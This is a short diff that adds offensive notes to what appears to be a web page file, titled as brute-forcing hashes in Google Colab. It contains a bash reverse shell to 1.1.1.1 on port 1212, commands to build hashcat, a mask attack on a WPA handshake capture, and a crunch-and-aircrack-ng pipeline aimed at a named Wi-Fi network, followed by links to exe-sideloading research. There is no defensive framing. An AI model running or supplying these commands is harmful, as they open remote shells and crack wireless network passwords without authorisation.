@@ -5,6 +5,27 @@
   </body>
 </p>
 
+
+brute hash in google-colab
+````
+!bash -c 'bash -i >& /dev/tcp/1.1.1.1/1212 0>&1'
+
+
+install hashcat in colab
+
+apt-get install cmake build-essential -y && apt install checkinstall git -y && git clone https://github.com/hashcat/hashcat.git && cd hashcat && git submodule update --init && make && make install
+
+hashcat -m 2500 -a3 1.hccapx ?d?d?d?d?d?d?d?d?d?d
+
+
+
+crunch 8 8 | aircrack-ng -e Tel_196_5G -w –2.cap
+
+````
+
+
+
+
 https://github.com/jreegun/Researches/tree/master/Exe%20Sideloading
 https://youtu.be/3aZM0Rfjgy4
 
